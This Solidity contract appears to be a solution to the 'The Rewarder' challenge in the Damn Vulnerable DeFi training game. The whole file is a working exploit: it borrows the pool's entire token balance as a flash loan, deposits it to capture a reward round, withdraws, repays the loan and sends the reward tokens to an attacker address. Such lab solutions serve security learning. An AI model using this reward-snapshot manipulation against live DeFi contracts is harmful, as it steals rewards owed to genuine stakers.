// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

contract TheRewarderExploit{

    //Take out max value flash-loan once a new round is initiatable
    //Deposit the flashloan in the rewarder pool contract, will automatically call distributeRewards()
    //withdraw the flashloan
    //pay it back

    DamnValuableToken public token;
    FlashLoanerPool public loanPool;
    TheRewarderPool public rewarderPool;
    RewardToken public rewardToken;
    address public attacker;

    constructor(address _tokenAddress, address _loanPool, address _rewarderPool, address _rewardToken, address _attacker){
        token = DamnValuableToken(_tokenAddress);
        loanPool = FlashLoanerPool(_loanPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        rewardToken = RewardToken(_rewardToken);
        attacker = _attacker;
    }

    function pwn() public{
        //Execute await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]) in test so we can trigger new round
        require(rewarderPool.isNewRewardsRound(), "Can not trigger new round distribution within flash loan in current block!");
        loanPool.flashLoan(token.balanceOf(address(loanPool)));

    }
    function receiveFlashLoan(uint256 amount) public{
        token.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        //rewarderPool.distributeRewards();
        rewarderPool.withdraw(amount);
        token.transfer(address(loanPool), amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }

}